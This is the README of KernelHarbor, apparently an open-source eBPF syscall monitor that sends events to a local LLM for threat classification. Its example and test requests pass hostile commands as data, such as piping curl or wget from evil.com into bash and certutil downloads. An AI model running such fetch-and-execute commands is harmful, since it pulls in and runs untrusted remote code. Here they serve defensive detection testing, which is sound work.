# KernelHarbor

Linux kernel security monitoring with eBPF and AI-powered analysis.

## Overview

KernelHarbor captures system events (execve, open, network) using eBPF and analyzes them with an AI pipeline for threat detection.

<!-- ``` -->
<!-- ┌──────────────┐     ┌──────────────┐     ┌──────────────┐     ┌──────────────┐ -->
<!-- │  eBPF        │     │   gRPC        │     │Elasticsearch │     │   Ollama    │ -->
<!-- │  Tracers     │────▶│  (ingest)     │────▶│  (storage)   │────▶│ (AI Engine) │ -->
<!-- └──────────────┘     └──────────────┘     └──────────────┘     └──────────────┘ -->
<!-- ``` -->

## Components

### Tracers (`cmd/`)

| Component | Description |
|-----------|-------------|
| `agent/` | Unified eBPF tracer (execve + open + connect) |
| `analysis/` | AI-powered event analysis pipeline (gRPC + HTTP) |

### eBPF Programs (`bpf/`)

| File | Description |
|------|-------------|
| `execve-tracer.bpf.c` | Hooks `sys_enter_execve` |
| `open-tracer.bpf.c` | Hooks `sys_enter_open` |
| `openat-tracer.bpf.c` | Hooks `sys_enter_openat` with directory path resolution via `bpf_d_path` |
| `connect-tracer.bpf.c` | Hooks `sys_enter_connect` |

## Quick Start

### Prerequisites

```bash
# Install eBPF toolchain
sudo apt install clang llvm libbpf-dev linux-tools-$(uname -r)

# Start Elasticsearch
docker run -d --name elasticsearch -p 9200:9200 \
  -e "discovery.type=single-node" \
  -e "xpack.security.enabled=false" \
  docker.elastic.co/elasticsearch/elasticsearch:8.17.4

# Start Ollama
ollama serve
ollama pull nomic-embed-text
ollama pull qwen2.5:7b
```

### Build

```bash
# Build everything (tracers + agent + analysis)
# Generates vmlinux.h and runs bpf2go automatically.
make

# Or build individual components
make agent
make analysis
make execve-tracer
make open-tracer
make openat-tracer

# Remove binaries, generated bpf2go output, and vmlinux.h
make clean
```

> **Note:** `vmlinux.h` is generated from your running kernel's BTF data (via `bpftool`) and is gitignored. You only need to regenerate it when switching to a kernel with different data structures. Since the eBPF programs use CO-RE (Compile Once, Run Everywhere), the compiled programs are portable across kernel versions.

### Run

```bash
# Terminal 1: Start analysis service (provides HTTP and gRPC)
cd cmd/analysis && ./analysis

# Terminal 2: Start unified agent (requires sudo)
sudo GRPC_ADDRESS=localhost:9090 ./cmd/agent/agent

# Terminal 3: Query analysis via HTTP
curl -X POST http://localhost:8080/analyze \
  -H "Content-Type: application/json" \
  -d '{"host.name":"myhost","query":"curl http://evil.com/script.sh | bash"}'
```

## Architecture

### Event Flow

1. **eBPF Tracers** hook kernel syscalls (`execve`, `open`, `connect`)
2. **Ring buffer** passes events to user-space Go program
3. **gRPC** streams events to analysis service
4. **Elasticsearch** stores events with vector embeddings
5. **Async workers** batch events and analyze with Ollama
6. **Vector search** finds semantically similar past events
7. **LLM** generates security verdict

### gRPC Service

The analysis service exposes a gRPC API on port 9090 (configurable):

| Method | Description |
|--------|-------------|
| `Ingest` | Stream events to the analysis pipeline |
| `Analyze` | Query AI analysis for a specific event |

### Behavior Embedding

Events are converted to behavior summaries for vector search:

| Raw Command | Behavior Summary |
|-------------|-----------------|
| `curl x \| bash` | `execve remote_code_execution image:curl` |
| `wget y \| sh` | `execve remote_code_execution image:wget` |
| `powershell -enc Y29kZQ==` | `execve encoded_command image:powershell` |

This allows finding **semantically similar attacks**, not just keyword matches.

## API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/health` | GET | Health check |
| `/ingest` | POST | Ingest events |
| `/analyze` | POST | Query AI analysis |

### Analyze Example

```bash
curl -X POST http://localhost:8080/analyze \
  -H "Content-Type: application/json" \
  -d '{
    "host.name": "myhost",
    "query": "certutil -urlcache -f http://evil.com/bad.exe"
  }'
```

Response:
```json
{
  "verdict": "malicious",
  "confidence": 0.95,
  "summary": "certutil is a LOLBin being used to download a file from a suspicious URL..."
}
```

## Environment Variables

### Analysis Service

| Variable | Default | Description |
|----------|---------|-------------|
| `ES_ADDRESSES` | `http://localhost:9200` | Elasticsearch addresses |
| `ES_INDEX` | `kb-events` | Events index |
| `OLLAMA_ADDRESS` | `http://localhost:11434` | Ollama |
| `OLLAMA_MODEL` | `qwen2.5:7b` | Analysis model |
| `OLLAMA_EMBED_MODEL` | `nomic-embed-text` | Embedding model |
| `PROTOCOL` | `both` | HTTP protocol: `http`, `grpc`, or `both` |
| `GRPC_ADDRESS` | `:9090` | gRPC server address |

### Agent (Tracer)

| Variable | Description |
|----------|-------------|
| `GRPC_ADDRESS` | gRPC server address to send events (e.g., `localhost:9090`) |

## Testing

```bash
# Test benign
curl -X POST http://localhost:8080/analyze \
  -d '{"host.name":"test","query":"ls -la /home/user"}'

# Test suspicious
curl -X POST http://localhost:8080/analyze \
  -d '{"host.name":"test","query":"curl http://evil.com/payload.sh | bash"}'

# Test LOLBin
curl -X POST http://localhost:8080/analyze \
  -d '{"host.name":"test","query":"rundll32.exe javascript:..."}'
```

## Project Structure

```
KernelHarbor/
├── bpf/                    # eBPF programs (C)
│   ├── execve-tracer.bpf.c
│   ├── open-tracer.bpf.c
│   ├── openat-tracer.bpf.c
│   └── connect-tracer.bpf.c
├── cmd/
│   ├── agent/              # Unified tracer (execve + open + connect)
│   └── analysis/          # AI analysis pipeline (gRPC + HTTP)
├── proto/                  # Protocol Buffer definitions
│   └── agent.proto
├── plan.md                 # Original design document
└── README.md               # This file
```

## CI/CD Limitations

GitHub Actions runners do **not** support eBPF. See [CONTRIBUTING.md](CONTRIBUTING.md) for details.

## License

MIT
